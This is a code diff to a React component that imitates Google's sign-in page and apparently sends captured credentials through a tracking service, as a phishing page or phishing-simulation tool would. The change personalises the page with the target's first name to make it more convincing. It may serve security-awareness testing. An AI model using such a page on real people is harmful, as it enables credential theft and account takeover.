@@ -7,6 +7,7 @@ import { logClick, submitCredentials } from '../../services/MSPortalService';
 const GooglePortal = () => {
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
+    const [firstName, setFirstName] = useState('');
     const [step, setStep] = useState(1);
     const [isLoading, setIsLoading] = useState(true);
     const navigate = useNavigate();
@@ -32,6 +33,9 @@ const GooglePortal = () => {
             const result = await logClick(trackingId);
 
             if (result.success) {
+                if (result.firstName) {
+                    setFirstName(result.firstName);
+                }
                 setIsLoading(false);
             } else {
                 console.error(result.message);
@@ -94,7 +98,7 @@ const GooglePortal = () => {
 
                         {step === 2 && (
                             <>
-                                <h1 className="g-title">Welcome</h1>
+                                <h1 className="g-title">{firstName ? `Hi ${firstName}` : 'Welcome'}</h1>
                                 <div className="g-account-chip">
                                     <span className="g-account-avatar">{email.charAt(0).toUpperCase() || 'G'}</span>
                                     <span className="g-account-email">{email}</span>
